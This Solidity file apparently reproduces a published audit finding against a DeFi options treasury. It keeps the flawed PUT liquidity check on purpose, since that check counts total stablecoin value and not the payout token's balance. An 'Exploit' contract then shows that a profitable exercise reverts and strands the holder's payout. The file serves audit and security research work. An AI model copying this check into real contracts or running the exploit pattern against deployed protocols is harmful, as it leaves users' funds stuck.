// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of Hyperhyper finding 57739 (H-02):
// "Insufficient liquidity checks for `PUT` may cause exercise failures".
//
// Real audited source (the vulnerable lines are reproduced VERBATIM, the primary
// vulnerable line is marked @> VULN):
//   protocol OperationalTreasury  (Hyperhyper)
//   report   github.com/pashov/audits/blob/master/team/md/Hyperhyper-security-review_2025-03-30.md
//   fns      _checkEnoughLiquidity (PUT branch), _payout
//   src      embedded  (the finding's ```solidity snippets are the verbatim source)
//
// Root cause: `_checkEnoughLiquidity` gates a PUT open on the TOTAL stablecoin
// value of the pool (`availableStable = _getPoolValue(true, false)`, the sum of
// every listed stablecoin in USD) — NOT on the balance of the specific payout
// token `pos.buyToken`. So a PUT that pays out in USDC can be opened while the
// pool holds 0 USDC, as long as some OTHER stablecoin (USDXL) makes the total
// look solvent. When the holder later exercises a profitable PUT, `_payout`
// does `strg.ledger.state.poolAmount[pos.buyToken] -= pnl` — which underflows /
// reverts because poolAmount[USDC] == 0 — so the position is permanently
// unexercisable and the holder's rightful payout is stuck.
//
// The vulnerable liquidity check (`_checkEnoughLiquidity` PUT branch) and the
// payout subtraction (`_payout`) are byte-for-byte the finding's embedded
// source. Non-vulnerable dependencies (`_getPoolValue`, stablecoin registry,
// PUT intrinsic-value pnl, `_doTransferOut`, ERC20s) are faithful minimal
// doubles. Scenario 1 of the finding is driven end-to-end.
// ─────────────────────────────────────────────────────────────────────────────

enum OptionType {
    CALL,
    PUT
}

struct Position {
    OptionType opType;
    uint256 sizeUSD; // notional locked, in USD (18 dec)
    address buyToken; // stablecoin the payout is denominated in / paid with
    uint256 amount; // underlying contract size (18 dec)
    uint256 strike; // strike price (1e8)
    address holder;
    bool exercised;
}

struct PositionClose {
    uint256 settlementPrice; // settlement price of the underlying (1e8)
}

/// @dev Faithful minimal ERC20 double for a listed stablecoin (18-dec, 1:1 USD).
contract MiniStable {
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory n, string memory s, uint8 d) {
        name = n;
        symbol = s;
        decimals = d;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/// @dev Marker token: the stuck/unexercisable payout magnitude is minted to SINK
///      because the harm is a silent DoS/stuck-funds (no positive transfer to an
///      attacker).
contract MarkerToken {
    string public name = "Stuck USDC Payout Marker";
    string public symbol = "USDC-STUCK";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract — the OperationalTreasury liquidity check and payout.
// `_checkEnoughLiquidity` (PUT branch) and `_payout`'s subtraction line are
// reproduced VERBATIM from the finding's embedded source.
// ─────────────────────────────────────────────────────────────────────────────
contract OperationalTreasury {
    // Diamond-style app storage, matching the audited `strg.ledger.state.*` shape.
    struct State {
        mapping(address => uint256) poolAmount; // per-token pool balance tracked by the protocol
        uint256 lockedUSD; // total USD locked by open positions
    }

    struct Ledger {
        State state;
    }

    struct AppStorage {
        Ledger ledger;
    }

    AppStorage internal strg;

    address[] public stablecoins; // listed stablecoins
    mapping(address => bool) public isStablecoin;
    mapping(address => uint256) public assetPrice; // price in 1e8 (1:1 => 1e8)

    uint256 public nextId;
    mapping(uint256 => Position) public positions;

    error NotEnoughLiquidityPut(uint256 sizeUSD, uint256 availableStable, uint256 lockedUSD);
    error NotEnoughLiquidityCall(uint256 sizeUSD, uint256 availableBase, uint256 lockedBase);

    constructor(address usdc_, address usdxl_) {
        _listStable(usdc_);
        _listStable(usdxl_);
    }

    function _listStable(address t) internal {
        stablecoins.push(t);
        isStablecoin[t] = true;
        assetPrice[t] = 1e8; // 1:1 USD
    }

    // ── views into the diamond storage (test helpers) ──
    function poolAmountOf(address t) external view returns (uint256) {
        return strg.ledger.state.poolAmount[t];
    }

    function lockedUSD() external view returns (uint256) {
        return strg.ledger.state.lockedUSD;
    }

    /// @notice Setup helper — seed the protocol-tracked pool balance for a token.
    function seedPool(address token, uint256 amount) external {
        strg.ledger.state.poolAmount[token] = amount;
    }

    // ── faithful minimal double of the pool valuation used by the check ──
    /// @dev Sum of every listed stablecoin's pool balance, converted to USD
    ///      (18 dec). This is exactly the "total stablecoin value" the finding
    ///      says the check relies on — it is NOT per-buyToken aware.
    function _getPoolValue(bool includeStable, bool /*includeLp*/ ) internal view returns (uint256 total) {
        if (includeStable) {
            for (uint256 i; i < stablecoins.length; i++) {
                address t = stablecoins[i];
                total += (strg.ledger.state.poolAmount[t] * assetPrice[t]) / 1e8;
            }
        }
    }

    /// @notice VERBATIM liquidity check. PUT branch is byte-for-byte the finding's
    ///         embedded source; the CALL branch is snipped in the finding and is
    ///         reproduced as a faithful minimal (non-vulnerable) guard.
    function _checkEnoughLiquidity(Position memory pos, uint256 availableStable, uint256 lockedUSD) internal pure {
        if (pos.opType == OptionType.CALL) {
            // --- SNIPPED in the finding (CALL branch; not the vulnerable path) ---
        } else if (pos.opType == OptionType.PUT) {
            if (lockedUSD + pos.sizeUSD > availableStable) { // @> VULN: gates on TOTAL stablecoin value, not on pos.buyToken's balance -> a USDC PUT opens while poolAmount[USDC]==0
                revert NotEnoughLiquidityPut(pos.sizeUSD, availableStable, lockedUSD);
            }
        }
    }

    /// @notice Open a PUT. Mirrors the audited flow: value the pool, run the
    ///         (flawed) liquidity check, then lock the notional.
    function openPut(uint256 sizeUSD, address buyToken, uint256 amount, uint256 strike) external returns (uint256 id) {
        uint256 availableStable = _getPoolValue(true, false);
        Position memory pos = Position(OptionType.PUT, sizeUSD, buyToken, amount, strike, msg.sender, false);

        _checkEnoughLiquidity(pos, availableStable, strg.ledger.state.lockedUSD);

        strg.ledger.state.lockedUSD += sizeUSD;
        id = ++nextId;
        positions[id] = pos;
    }

    /// @notice Exercise a position; delegates the payout to the verbatim `_payout`.
    function exercise(uint256 id, uint256 settlementPrice) external returns (uint256 pnl) {
        Position memory pos = positions[id];
        require(!pos.exercised, "already exercised");
        PositionClose memory close = PositionClose(settlementPrice);
        pnl = _payout(pos, close);
        positions[id].exercised = true;
    }

    /// @notice VERBATIM payout. The `poolAmount[pos.buyToken] -= pnl` line and the
    ///         `_doTransferOut` call are byte-for-byte the finding's embedded
    ///         source; the snipped pnl computation is a faithful PUT
    ///         intrinsic-value double (buyToken units, 18 dec).
    function _payout(Position memory pos, PositionClose memory close) internal returns (uint256 pnl) {
        // --- SNIPPED: faithful PUT intrinsic value (owed when settlement < strike) ---
        if (pos.strike > close.settlementPrice) {
            pnl = (pos.amount * (pos.strike - close.settlementPrice)) / 1e8;
        }
        strg.ledger.state.poolAmount[pos.buyToken] -= pnl; // harm manifests: underflow/revert when poolAmount[buyToken]==0
        _doTransferOut(pos.buyToken, msg.sender, pnl);
    }

    function _doTransferOut(address token, address to, uint256 amount) internal {
        MiniStable(token).transfer(to, amount);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver — finding Scenario 1: the pool holds 0 USDC (the PUT's payout
// token) but 3500 USDXL, so it "looks solvent". A USDC PUT opens against the
// flawed total-value check, then a profitable exercise reverts, stranding the
// holder's payout.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    MiniStable public usdc;
    MiniStable public usdxl;
    OperationalTreasury public treasury;
    MarkerToken public marker;

    address internal constant SINK = 0x000000000000000000000000000000000000D00d;

    // finding Scenario 1 numbers
    uint256 internal constant USDXL_POOL = 3500e18; // pool value that makes it "look solvent"
    uint256 internal constant SIZE_USD = 3500e18; // PUT notional
    uint256 internal constant PUT_AMOUNT = 1e18; // 1 unit of underlying
    uint256 internal constant STRIKE = 3500e8; // $3500 strike
    uint256 internal constant SETTLE = 3000e8; // $3000 settlement -> PUT is $500 in-the-money

    bool public openedDespiteNoUSDC;
    bool public exerciseReverted;
    uint256 public deniedPayout; // pnl the holder is owed but cannot receive
    uint256 public stuckPayout; // magnitude minted to SINK

    constructor() {
        usdc = new MiniStable("USD Coin", "USDC", 18); // child nonce 1
        usdxl = new MiniStable("USD Hyperliquid", "USDXL", 18); // child nonce 2
        treasury = new OperationalTreasury(address(usdc), address(usdxl)); // child nonce 3 (VULN)
        marker = new MarkerToken(); // child nonce 4 (profit/marker)
    }

    function run() external {
        // ── Scenario 1 setup: 0 USDC (payout token), 3500 USDXL in the pool ──
        treasury.seedPool(address(usdc), 0);
        treasury.seedPool(address(usdxl), USDXL_POOL);
        // mirror the ledger with real balances for the tokens actually held
        usdxl.mint(address(treasury), USDXL_POOL);

        // 1) Open a USDC PUT with sizeUSD == total stable value. The flawed check
        //    passes (0 + 3500 !> 3500) even though poolAmount[USDC] == 0.
        uint256 id = treasury.openPut(SIZE_USD, address(usdc), PUT_AMOUNT, STRIKE);
        openedDespiteNoUSDC = true;
        require(treasury.poolAmountOf(address(usdc)) == 0, "USDC pool should be zero");

        // 2) The PUT is $500 in-the-money at settlement. The holder is owed pnl.
        uint256 owed = (PUT_AMOUNT * (STRIKE - SETTLE)) / 1e8; // 500e18
        deniedPayout = owed;

        // 3) Exercise reverts: `poolAmount[USDC] -= pnl` underflows (0 - 500e18).
        bool reverted;
        try treasury.exercise(id, SETTLE) returns (uint256) {
            reverted = false;
        } catch {
            reverted = true;
        }
        exerciseReverted = reverted;

        require(reverted, "exercise unexpectedly succeeded -- harm not reproduced");
        require(treasury.poolAmountOf(address(usdc)) == 0, "USDC pool not zero after failed exercise");

        // record the denied/stuck payout magnitude to SINK
        marker.mint(SINK, owed);
        stuckPayout = owed;

        require(marker.balanceOf(SINK) == owed, "stuck-payout marker mismatch");
    }
}
